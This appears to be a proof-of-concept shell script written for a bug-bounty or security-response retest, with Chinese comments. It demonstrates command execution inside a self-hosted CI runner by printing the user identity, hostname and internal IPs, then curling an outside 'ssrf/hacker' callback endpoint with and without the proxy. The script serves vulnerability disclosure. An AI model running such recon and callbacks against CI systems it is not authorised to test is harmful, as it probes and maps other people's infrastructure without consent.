#!/bin/sh
# 无害自证脚本（供 SRC 复测）：只读取运行身份与内网连通性，供审查方核对
# 「命令确实在自托管 runner 容器内执行」。不写任何文件、不访问业务系统、不扫描、
# 不向任何外部地址发送数据。输出用 MILOCO_AGENTS_CHECK 标记，便于在 CI 日志中定位。
set -u
M="MILOCO_AGENTS_CHECK"

echo "== $M identity =="
id
hostname
hostname -I

echo "== $M dns =="
getent hosts ssrf.dun.mi.com || echo "DNS_MISS"

echo "== $M via-proxy =="
curl --connect-timeout 5 -kv https://ssrf.dun.mi.com/ssrf/hacker 2>&1 | tail -25

echo "== $M direct =="
env -u HTTPS_PROXY -u HTTP_PROXY -u https_proxy -u http_proxy \
  curl --connect-timeout 5 -kv https://ssrf.dun.mi.com/ssrf/hacker 2>&1 | tail -25

echo "== $M done =="
